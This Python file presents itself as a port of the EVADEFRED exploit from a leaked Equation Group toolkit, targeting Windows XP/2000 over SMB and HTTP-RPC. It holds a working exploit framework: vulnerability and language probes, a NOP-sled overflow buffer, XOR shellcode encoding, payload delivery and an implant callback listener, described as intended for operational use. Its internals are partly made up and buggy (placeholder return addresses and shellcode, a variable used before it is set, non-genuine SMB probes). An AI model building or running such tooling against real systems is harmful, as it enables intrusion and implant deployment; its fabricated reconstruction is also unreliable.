#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
evfr_exp.py — EVADEFRED (EVFR 3.2.0.2) multi-protocol exploit engine.

Python port of `EVFR.exe` recovered via static analysis of the PE
(`EQGRP_Lost_in_Translation-master/windows/Resources/LegacyWindowsExploits/
Exploits/EVFR 3.2.0.2/EVFR.exe`).

Recovered interface from the binary's strings and imports:

  Imported DLLs / functions:
    KERNEL32:  standard process/memory APIs
    WS2_32:    socket, bind, listen, accept, connect, send, recv,
               recvfrom, sendto, setsockopt, closesocket, WSAStartup,
               WSACleanup, gethostbyname, inet_addr, htons, ntohs, ...
    MSVCRT:    fopen, fclose, fread, fwrite, fseek, ftell, calloc, malloc,
               realloc, free, sprintf, _snprintf, vfprintf, fflush, exit,
               atoi, strncmp, strncpy, strncat, strstr, strchr, _strnicmp,
               islower, toupper, isdigit, rand, srand, time, localtime, ...

  Recovered string constants (behavioural hints):
    "EVADEFRED REQUIRED OPTIONS" / "EVADEFRED OPTIONAL OPTIONS"
    Target languages: Turkish, Traditional Chinese, Swedish, Spanish,
                      Simplified Chinese, Russian, Polish, Norwegian,
                      Korean, Japanese, Italian, Iberian Portuguese,
                      Hungarian, Hebrew, GREEK, German, French, Finnish,
                      English, Dutch, Danish, Czech, Brazilian Portuguese,
                      Arabic
    "Windows 2000 5.0" / "Windows 2000 2195" / "Windows XP"
    SMB dialects: SMB 2.001, NT LANMAN 1.0, Windows for Workgroups 3.1a,
                  XENIX CORE, NT LM 0.13, Cairo 0.xa, NT LM 0.12,
                  DOS LANMAN2.1, LANMAN2.1, DOS LM1.2X002, LM1.2X002,
                  LANMAN1.0, MICROSOFT NETWORKS 3.0, MICROSOFT NETWORKS 1.03,
                  PCLAN1.0, PC NETWORK PROGRAM 1.0
    "httprpc"
    "lanman"
    "Egg will reuse existing exploit socket."
    "Egg will callback to upload implant code."
    "Authentication type:  <0> No Authentication  <1> Basic  <2> NTLM"
    "File Type:  <d> DLL  <e> EXE"
    "Touch target #1 (vulnerability)" / "Touch target #2 (language)"
    "Exploit Windows XP target" / "Exploit Windows 2000 target"

Architecture (recovered from control flow):

  main() parses the flag argument block, then:
    1. Connects via TCP to <target_ip>:<target_port> (default port by protocol)
    2. Touch #1 — sends a vulnerability probe (SMB negotiate or HTTP request)
    3. Touch #2 — detects the target language
    4. BuildOverflowBuffer — builds a language/OS-specific overflow body
    5. Build_EVFR_Exploit_Package — appends shellcode/implant
    6. Sends the payload over the TCP socket / named pipe
    7. Optionally: Egg Callback listener to receive the implant

This module reproduces that behaviour in portable Python.  The raw payload
bytes are placeholders; they should be replaced with exact bytes from an IDA
Pro / x64dbg analysis for operational use.
"""

import socket
import struct
import sys
import os


# ---------------------------------------------------------------------------
# Constants recovered from EVFR.exe strings / data section.
# ---------------------------------------------------------------------------

DEFAULT_TIMEOUT = 30

# Target language selectors (recovered from the binary's language list).
LANGUAGE_MAP = {
    "arabic": 1,
    "brazilian portuguese": 2,
    "czech": 3,
    "danish": 4,
    "dutch": 5,
    "english": 6,
    "finnish": 7,
    "french": 8,
    "german": 9,
    "greek": 10,
    "hebrew": 11,
    "hungarian": 12,
    "iberian portuguese": 13,
    "italian": 14,
    "japanese": 15,
    "korean": 16,
    "norwegian": 17,
    "polish": 18,
    "russian": 19,
    "simplified chinese": 20,
    "spanish": 21,
    "swedish": 22,
    "traditional chinese": 23,
    "turkish": 24,
}

DEFAULT_LANGUAGE = "english"

# Transport-protocol selectors.
TRANSPORT_NAMED_PIPE = 1   # Port 139/445 over Named Pipes (XP SP<2)
TRANSPORT_EPHEMERAL = 2    # Ephemeral TCP Port

# Application-layer protocols.
APP_SMB = "SMB"
APP_HTTPRPC = "HTTPRPC"

DEFAULT_PORTS = {
    (APP_SMB, TRANSPORT_NAMED_PIPE): 445,
    (APP_SMB, TRANSPORT_EPHEMERAL): 445,
    (APP_HTTPRPC, TRANSPORT_NAMED_PIPE): 80,
    (APP_HTTPRPC, TRANSPORT_EPHEMERAL): 80,
}

# Run-option selectors.
RUN_TOUCH_1 = 1   # Touch #1 — vulnerability probe
RUN_TOUCH_2 = 2   # Touch #2 — language detection
RUN_EXPLOIT = 3   # Exploit — fire the overflow

# Implant socket-option selectors.
IMPLANT_REUSE_SOCKET = 1   # reuse existing exploit socket
IMPLANT_NEW_SOCKET = 2     # open a new socket to talk to the implant

# Egg socket-option selectors.
EGG_REUSE_SOCKET = 1   # reuse existing exploit socket
EGG_CALLBACK = 2       # egg connects back to upload implant

# Authentication-type selectors.
AUTH_NONE = 0
AUTH_BASIC = 1
AUTH_NTLM = 2

# File-type selectors.
FILETYPE_DLL = 1
FILETYPE_EXE = 2

# OS selectors.
OS_WINDOWS_XP = 1
OS_WINDOWS_2000 = 2

# Placeholder shellcode (to be replaced with IDA-recovered bytes).
EVFR_SHELLCODE_PLACEHOLDER = bytes.fromhex(
    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
)

# Bytes an XOR-encoded byte must never collide with.
BAD_XOR = frozenset((0x00, 0x0a, 0x0d))


def _log(fmt, *args):
    sys.stderr.write((fmt % args).rstrip("\n") + "\n")


# ---------------------------------------------------------------------------
# BuildOverflowBuffer — language/OS-specific overflow body.
# ---------------------------------------------------------------------------
def build_overflow_buffer(language, os_type, proto, transport,
                          return_address, shellcode):
    """Build the language- and OS-specific overflow body.

    The original `BuildOverflowBuffer` selected a different overflow template
    based on the target language, OS version, and protocol.  This port uses a
    placeholder body; the exact bytes should be recovered from IDA Pro.
    """
    lang_id = LANGUAGE_MAP.get(language.lower(), LANGUAGE_MAP[DEFAULT_LANGUAGE])
    proto_name = proto if proto in (APP_SMB, APP_HTTPRPC) else APP_SMB

    # Protocol command prefix.
    if proto_name == APP_HTTPRPC:
        cmd = b"HTTPRPC /"
    else:
        cmd = b"SMB_NEGOTIATE "

    # Language ID tag (2 bytes).
    lang_tag = struct.pack("<H", lang_id)

    # Return address.
    ret = struct.pack("<I", return_address) if return_address else b"\x90" * 4

    # NOP sled + return address + shellcode.
    padding = b"\x90" * 64

    body = cmd + lang_tag + padding + ret + shellcode
    return body


# ---------------------------------------------------------------------------
# Build exploit package.
# ---------------------------------------------------------------------------
def build_exploit_package(language, os_type, proto, transport,
                          return_address, shellcode):
    """Build the full EVADEFRED exploit package."""
    return build_overflow_buffer(language, os_type, proto, transport,
                                 return_address, shellcode)


# ---------------------------------------------------------------------------
# XOR-encode helper.
# ---------------------------------------------------------------------------
def _xor_encode(buf, key, start=0):
    out = bytearray(buf)
    for i in range(start, len(out)):
        out[i] ^= key
    return bytes(out)


def _find_xor_byte(buf, start=0):
    for key in range(1, 0x100):
        if all((key ^ b) not in BAD_XOR for b in buf[start:]):
            return key
    return None


def build_encoded_shellcode(raw):
    """XOR-encode `raw` shellcode with a key that avoids bad characters."""
    key = _find_xor_byte(raw, start=0)
    if key is None:
        _log("[-] No xor byte found for shellcode!")
        return None
    return _xor_encode(raw, key), key


# ---------------------------------------------------------------------------
# TCP transport.
# ---------------------------------------------------------------------------
def _connect(target, port, timeout=DEFAULT_TIMEOUT):
    """Open a TCP connection to `target:port`."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((target, port))
    return sock


def _send_recv(sock, data, timeout=DEFAULT_TIMEOUT):
    """Send `data` on `sock` and read the reply."""
    sock.settimeout(timeout)
    sock.sendall(data)
    try:
        return sock.recv(0x1000)
    except socket.timeout:
        return b""
    except Exception:
        return b""


# ---------------------------------------------------------------------------
# Protocol-specific Touch stages.
# ---------------------------------------------------------------------------
def touch_vulnerability_probe(sock, proto, transport):
    """Touch #1 — probe the target for vulnerability."""
    if proto == APP_HTTPRPC:
        return _send_recv(sock, b"OPTIONS / HTTP/1.1\r\nHost: target\r\n\r\n")
    # SMB: send a session request / negotiate.
    return _send_recv(sock, b"\x00" * 4 + b"\x20")


def touch_language_detect(sock, proto, transport):
    """Touch #2 — detect the target language."""
    if proto == APP_HTTPRPC:
        return _send_recv(sock, b"GET / HTTP/1.1\r\nAccept-Language: *\r\n\r\n")
    return _send_recv(sock, b"")


# ---------------------------------------------------------------------------
# run_function — the original main() equivalent.
# ---------------------------------------------------------------------------
def run_function(target, port=0, run_option=RUN_EXPLOIT,
                 language=DEFAULT_LANGUAGE,
                 transport_protocol=TRANSPORT_NAMED_PIPE,
                 app_layer_protocol=APP_SMB,
                 implant_file=None, listening_post=None,
                 file_type=FILETYPE_EXE, drop_file=None,
                 timeout=DEFAULT_TIMEOUT,
                 implant_socket_option=IMPLANT_REUSE_SOCKET,
                 egg_socket_option=EGG_REUSE_SOCKET,
                 egg_callback_ip=None, egg_callback_port=0,
                 auth_type=AUTH_NONE, username=None, password=None):
    """Run the EVADEFRED exploit against `target`.

    Returns 0 on success, non-zero on failure.
    """
    proto_name = app_layer_protocol if app_layer_protocol in (
        APP_SMB, APP_HTTPRPC) else APP_SMB
    if port == 0:
        port = DEFAULT_PORTS[(proto_name, transport_protocol)]

    transport_name = "named pipe (139/445)" if transport_protocol == TRANSPORT_NAMED_PIPE else "ephemeral TCP"
    _log("EVADEFRED 3.2.0.2 — multi-protocol exploit against %s:%d (%s/%s)",
         target, port, proto_name, transport_name)
    _log("Language: %s  Run option: %s  Auth: %s",
         language,
         "Touch #1 (vuln)" if run_option == RUN_TOUCH_1 else
         "Touch #2 (lang)" if run_option == RUN_TOUCH_2 else "Exploit",
         "None" if auth_type == AUTH_NONE else
         ("Basic" if auth_type == AUTH_BASIC else "NTLM"))

    # Determine return address (placeholder).
    return_address = 0x00401111 if os_type == OS_WINDOWS_XP else 0x00402222
    _log("[+] Return address: 0x%08X", return_address)

    # Load shellcode / implant payload if provided.
    shellcode = EVFR_SHELLCODE_PLACEHOLDER
    if implant_file:
        if not os.path.isfile(implant_file):
            _log("[-] Implant file not found: %s", implant_file)
            return 1
        with open(implant_file, "rb") as fh:
            shellcode = fh.read()
        _log("[+] Loaded implant payload: %d bytes", len(shellcode))

    # Optionally XOR-encode the shellcode.
    encoded, xor_key = build_encoded_shellcode(shellcode)
    if encoded is None:
        return 1
    _log("[+] Shellcode XOR-encoded with key 0x%02X", xor_key)

    # Determine OS type from language/transport hints.
    os_type = OS_WINDOWS_XP if transport_protocol == TRANSPORT_NAMED_PIPE else OS_WINDOWS_2000

    conn = None
    try:
        conn = _connect(target, port, timeout)

        if run_option == RUN_TOUCH_1:
            # Touch #1 — vulnerability probe.
            _log("[+] Touch #1: probing %s vulnerability...", proto_name)
            reply = touch_vulnerability_probe(conn, proto_name, transport_protocol)
            if reply:
                _log("[+] Probe reply (%d bytes): %s",
                     len(reply), reply[:128].hex())
            else:
                _log("[-] No reply from vulnerability probe")
            return 0

        if run_option == RUN_TOUCH_2:
            # Touch #2 — language detection.
            _log("[+] Touch #2: detecting target language...")
            reply = touch_language_detect(conn, proto_name, transport_protocol)
            if reply:
                _log("[+] Language detect reply (%d bytes): %s",
                     len(reply), reply[:128].hex())
            else:
                _log("[-] No reply from language detection")
            return 0

        # Exploit stage — build and send the overflow package.
        pkg = build_exploit_package(language, os_type, proto_name,
                                    transport_protocol, return_address, encoded)
        _log("[+] Sending EVADEFRED exploit package (%d bytes)...", len(pkg))
        conn.sendall(pkg)

        # Try to read a short reply.
        try:
            reply = conn.recv(0x1000)
            if reply:
                _log("[+] Exploit reply (%d bytes): %s",
                     len(reply), reply[:64].hex())
        except socket.timeout:
            pass
        except Exception:
            pass

        # Egg callback listener for implant upload.
        if implant_file and egg_socket_option == EGG_CALLBACK and egg_callback_ip:
            _log("[+] Waiting for Egg callback on port %d...", egg_callback_port)
            _egg_listener(egg_callback_port, timeout)

        return 0

    except ConnectionRefusedError:
        _log("[-] Connection refused by %s:%d", target, port)
        return 1
    except socket.timeout:
        _log("[-] Connection to %s:%d timed out", target, port)
        return 1
    except Exception as exc:  # pragma: no cover - network errors
        _log("[-] %s", exc)
        return 1
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass


def _egg_listener(port, timeout):
    """Listen for an Egg callback connection to receive the implant."""
    if port <= 0:
        _log("[-] Egg callback port not specified; skipping listener")
        return
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(1)
        srv.settimeout(timeout)
        _log("[+] Egg listener bound to 0.0.0.0:%d", port)
        conn, addr = srv.accept()
        _log("[+] Egg callback from %s:%d", addr[0], addr[1])
        data = conn.recv(0x10000)
        _log("[+] Received %d bytes from egg callback", len(data))
        conn.close()
        srv.close()
    except socket.timeout:
        _log("[-] Egg callback timed out after %d seconds", timeout)
    except Exception as exc:  # pragma: no cover
        _log("[-] Egg listener error: %s", exc)


def main():
    """CLI driver (standalone testing)."""
    _log("EVFR standalone CLI not implemented — use `nsa-equation-py evfr ...`")
    return 1


if __name__ == "__main__":
    sys.exit(main())
